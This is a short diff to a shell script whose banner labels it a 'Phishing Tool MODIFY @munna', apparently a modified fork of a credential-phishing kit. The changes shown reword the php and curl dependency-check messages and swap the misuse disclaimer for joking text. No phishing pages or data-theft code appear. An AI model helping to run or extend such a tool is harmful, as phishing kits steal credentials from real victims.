@@ -5,8 +5,8 @@ trap 'printf "\n";stop;exit 1' 2
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { echo >&2 "Plase install php  it's not installed. Install it. Aborting."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "plasec install curl it's not installed. Install it. Aborting."; exit 1; }
+command -v php > /dev/null 2>&1 || { echo >&2 "pkg install php :::: (php not here)."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "pkg install curl ::::.it's not installed"; exit 1; }
 
 }
 
@@ -141,8 +141,8 @@ echo "╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░�
 echo 
 printf "\e[1;93m       .:.:.\e[0m\e[1;77m Phishing Tool MODIFY @munna \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"                                                               
-printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"       
-printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by YOUR RESPONSIBLE NOT ME NOT THIS TOOL ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: mandi kade badsa bhari chandgi use madi ::\e[0m\n"       
+printf "  \e[101m\e[1;77m:: ## std college ##########jai bca####### ::\e[0m\n"
 printf "\n"
 }
 
